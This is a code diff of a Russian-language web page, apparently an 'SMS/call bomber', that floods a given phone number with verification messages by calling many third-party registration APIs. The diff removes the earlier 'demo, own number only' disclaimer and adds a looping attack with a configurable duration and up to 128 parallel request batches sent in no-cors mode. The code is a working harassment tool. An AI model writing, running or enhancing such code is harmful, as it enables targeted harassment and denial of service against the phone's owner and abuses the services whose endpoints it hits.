@@ -3,75 +3,187 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>SMS Spammer (Demo)</title>
+  <title>WhoBomb</title>
   <style>
+    :root {
+      --bg: linear-gradient(135deg, #12122a, #1e0d30);
+      --card-bg: #1a1a2e;
+      --primary: #bb86fc;
+      --secondary: #03dac6;
+      --text: #ffffff;
+      --border: #333;
+      --btn-gradient: linear-gradient(90deg, #bb86fc, #ff8a80);
+    }
+
     body {
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-      background: #1e1e1e;
-      color: #f0f0f0;
-      padding: 20px;
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      overflow-x: hidden;
     }
+
     .container {
-      max-width: 600px;
-      margin: 0 auto;
+      background: var(--card-bg);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      width: 400px;
+      max-width: 90%;
     }
-    h1 {
+
+    .header {
       text-align: center;
-      color: #4caf50;
+      margin-bottom: 20px;
     }
-    input, button {
+
+    .header h1 {
+      font-size: 28px;
+      margin: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .header span {
+      font-size: 24px;
+      color: #ff8a80;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 14px;
+      opacity: 0.8;
+    }
+
+    input {
       width: 100%;
       padding: 12px;
-      margin: 10px 0;
-      border: none;
-      border-radius: 6px;
+      background: #2d2d44;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      color: var(--text);
       font-size: 16px;
+      transition: all 0.3s ease;
     }
-    input {
-      background: #333;
-      color: white;
+
+    input:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 2px rgba(187, 134, 252, 0.2);
     }
+
     button {
-      background: #4caf50;
-      color: white;
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      font-size: 18px;
+      font-weight: bold;
       cursor: pointer;
+      transition: all 0.3s ease;
+      background: var(--btn-gradient);
+      color: white;
+      margin: 10px 0;
     }
+
     button:hover {
-      background: #45a049;
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(187, 134, 252, 0.4);
     }
+
     button:disabled {
-      background: #666;
+      opacity: 0.7;
       cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
     }
-    #log {
-      background: #2d2d2d;
-      padding: 15px;
-      border-radius: 6px;
-      height: 300px;
-      overflow-y: auto;
-      white-space: pre-wrap;
-      font-family: monospace;
+
+    .status {
+      background: #2d2d44;
+      padding: 12px;
+      border-radius: 8px;
+      margin-top: 10px;
       font-size: 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
     }
-    .note {
-      color: #aaa;
+
+    .status .check {
+      color: var(--secondary);
+      font-weight: bold;
+    }
+
+    .log {
+      height: 200px;
+      overflow-y: auto;
+      background: #2d2d44;
+      padding: 15px;
+      border-radius: 8px;
+      font-family: monospace;
       font-size: 12px;
-      margin-top: 15px;
-      text-align: center;
+      margin-top: 20px;
+      white-space: pre-wrap;
+    }
+
+    .controls {
+      display: flex;
+      gap: 10px;
+    }
+
+    .stop-btn {
+      background: #cf6679;
+    }
+
+    .stop-btn:hover {
+      background: #b00020;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>📞 SMS/Call Spammer (Demo)</h1>
-    <input type="text" id="phone" placeholder="+79991234567" value="+79991234567" />
-    <button id="sendBtn" onclick="startSpam()">Отправить запросы</button>
-    <div id="log">Ожидание...</div>
-    <p class="note">
-      ⚠️ Только для тестирования с собственным номером.<br>
-      Многие запросы могут не работать из-за CORS/no-cors.
-    </p>
+    <div class="header">
+      <h1>OpszBomb <span>💥</span></h1>
+    </div>
+
+    <div class="form-group">
+      <label>Номер телефона в формате +79999999999</label>
+      <input type="text" id="phone" placeholder="+79999999999" value="+79991234567" />
+    </div>
+
+    <div class="form-group">
+      <label>Время работы (секунды)</label>
+      <input type="number" id="duration" placeholder="10" value="10" min="1" max="300" />
+    </div>
+
+    <div class="form-group">
+      <label>Количество процессов для отправки запросов</label>
+      <input type="number" id="threads" placeholder="64" value="64" min="1" max="128" />
+    </div>
+
+    <div class="controls">
+      <button id="startBtn" onclick="startSpam()">Запустить</button>
+      <button id="stopBtn" class="stop-btn" onclick="stopSpam()" disabled>Остановить</button>
+    </div>
+
+    <div class="status">
+      <span class="check">✅</span>
+      <span>API загружено и готово к работе</span>
+    </div>
+
+    <div class="log" id="log">Ожидание...</div>
   </div>
 
   <script>
@@ -126,46 +238,87 @@
         ];
     }
 
+    let isRunning = false;
+    let stopFlag = false;
+
+    async function sendApi(api, phone) {
+      if (stopFlag) return;
+      
+      try {
+        const isGet = api.method === "GET";
+        const url = isGet ? api.url + api.bodyT(phone) : api.url;
+        const init = {
+          method: api.method,
+          mode: "no-cors",
+          credentials: "omit",
+          headers: api.headers
+        };
+        if (!isGet) {
+          init.body = api.name === "naomisushi-register" ? api.bodyT(phone, "") : api.bodyT(phone);
+        }
+
+        await fetch(url, init);
+        return `✅ ${api.name}`;
+      } catch (e) {
+        return `❌ ${api.name}`;
+      }
+    }
+
     async function startSpam() {
-        const phone = document.getElementById("phone").value.trim();
-        if (!phone || !/^\+7\d{10}$/.test(phone)) {
-            alert("Введите номер в формате +79991234567");
-            return;
+      const phone = document.getElementById("phone").value.trim();
+      const duration = parseInt(document.getElementById("duration").value) || 10;
+      const threads = parseInt(document.getElementById("threads").value) || 64;
+
+      if (!phone || !/^\+7\d{10}$/.test(phone)) {
+        alert("Введите номер в формате +79991234567");
+        return;
+      }
+
+      const log = document.getElementById("log");
+      const startBtn = document.getElementById("startBtn");
+      const stopBtn = document.getElementById("stopBtn");
+
+      startBtn.disabled = true;
+      stopBtn.disabled = false;
+      log.textContent = "🚀 Запуск...\n";
+      isRunning = true;
+      stopFlag = false;
+
+      const totalApis = apis().length;
+      const startTime = Date.now();
+
+      while (isRunning && (Date.now() - startTime) < duration * 1000) {
+        if (stopFlag) break;
+
+        const batch = [];
+        for (let i = 0; i < threads && i < totalApis; i++) {
+          const api = apis()[i];
+          batch.push(sendApi(api, phone));
         }
 
-        const log = document.getElementById("log");
-        const btn = document.getElementById("sendBtn");
-        btn.disabled = true;
-        btn.textContent = "Отправка...";
+        const results = await Promise.all(batch);
+        results.forEach(result => {
+          log.textContent += result + "\n";
+          log.scrollTop = log.scrollHeight;
+        });
 
-        log.textContent = "Начинаем отправку...\n";
+        // Ожидание перед следующей итерацией
+        await new Promise(r => setTimeout(r, 500));
+      }
 
-        for (const api of apis()) {
-            try {
-                const isGet = api.method === "GET";
-                const url = isGet ? api.url + api.bodyT(phone) : api.url;
-                const init = {
-                    method: api.method,
-                    mode: "no-cors", // Обход CORS, но без ответа
-                    credentials: "omit",
-                    headers: api.headers
-                };
-                if (!isGet) {
-                    init.body = api.name === "naomisushi-register" ? api.bodyT(phone, "") : api.bodyT(phone);
-                }
+      isRunning = false;
+      stopFlag = false;
+      startBtn.disabled = false;
+      stopBtn.disabled = true;
+      log.textContent += "\n🛑 Остановлено или завершено по таймеру.";
+    }
 
-                await fetch(url, init);
-                log.textContent += `✅ ${api.name}\n`;
-                // Небольшая задержка между запросами (опционально)
-                await new Promise(r => setTimeout(r, 100));
-            } catch (e) {
-                log.textContent += `❌ ${api.name}\n`;
-            }
-        }
-
-        btn.disabled = false;
-        btn.textContent = "Отправить ещё раз";
-        log.textContent += "\nГотово.";
+    function stopSpam() {
+      stopFlag = true;
+      isRunning = false;
+      document.getElementById("stopBtn").disabled = true;
+      document.getElementById("startBtn").disabled = false;
+      document.getElementById("log").textContent += "\n🛑 Принудительная остановка.";
     }
   </script>
 </body>
